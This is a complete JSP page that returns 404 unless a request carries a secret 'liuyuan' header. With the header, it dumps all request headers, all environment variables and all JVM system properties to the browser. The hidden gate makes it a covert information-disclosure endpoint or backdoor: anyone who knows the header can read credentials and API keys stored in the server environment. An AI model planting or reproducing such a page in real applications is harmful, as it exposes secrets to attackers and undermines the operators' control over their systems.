<%@page import="java.util.Enumeration"%>
<%@page import="java.util.Map"%>
<%

String headerValue = request.getHeader("liuyuan");
if(!"liuyuan".equals(headerValue)){
	response.sendError(404);
	return;
}

Enumeration e = request.getHeaderNames();
StringBuilder sb = new StringBuilder();
while(e.hasMoreElements()){
	String name = (String)e.nextElement();
	String value = request.getHeader(name);
	sb.append(name + " : " + value);
	sb.append("<br>");
}

sb.append("====================================================<br>");
for (Map.Entry<String,String> entry : System.getenv().entrySet()) {
	String key = entry.getKey();
	String value = entry.getValue();
	sb.append(key).append(" : ").append(value).append("<br>");
}
sb.append("====================================================<br>");
for (Map.Entry<Object,Object> entry : System.getProperties().entrySet()) {
	String key = (String)entry.getKey();
	String value = (String)entry.getValue();
	sb.append(key).append(" : ").append(value).append("<br>");
}

%>
<html>
<head>
</head>
<body>
<%=sb.toString() %>
</body>
</html>